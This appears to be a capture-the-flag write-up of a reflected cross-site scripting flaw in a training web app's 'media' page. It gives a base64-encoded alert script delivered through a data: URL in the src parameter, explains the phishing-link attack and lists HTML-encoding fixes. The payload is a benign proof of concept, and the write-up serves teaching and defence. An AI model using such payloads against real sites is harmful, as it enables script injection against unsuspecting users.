## Reflected Cross Site Scripting (XSS)

# Vulnerability
* See `http://[host]/?page=media&src=nsa`
* Modify `src` parameter
* See that it updates without validation an `<object>` element (The HTML 
<object> element represents an external resource, which can be treated as an 
image, a nested browsing context, or a resource to be handled by a plugin.)
```
<object data="[input]"></object>
```
* Base64 encode a malicious script
```
echo -e "<script>alert('42')</script>" | base64
```
It outputs `PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pgo=`
* Visit `http://[host]/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pgo=`
* Get the flag

# Attack

An attacker can create a malicious URL, then use social engineering tricks to 
lure victims into visiting a link to the URL. When victims click the link, they 
unwittingly reflect the malicious content through the vulnerable web application 
back to their own computers. This mechanism of exploiting vulnerable web 
applications is known as Reflected XSS. Base64 encoding is particularly
 useful for malicious code obfuscation. 
 
# Fix 
* Never insert untrusted data except in allowed location
* Or at least HTML encode before inserting untrusted data into HTML element
. For instance, in our example, `text/html` would be coded as `text&#x2F;html`.

# Reference
https://owasp.org/www-community/attacks/xss/
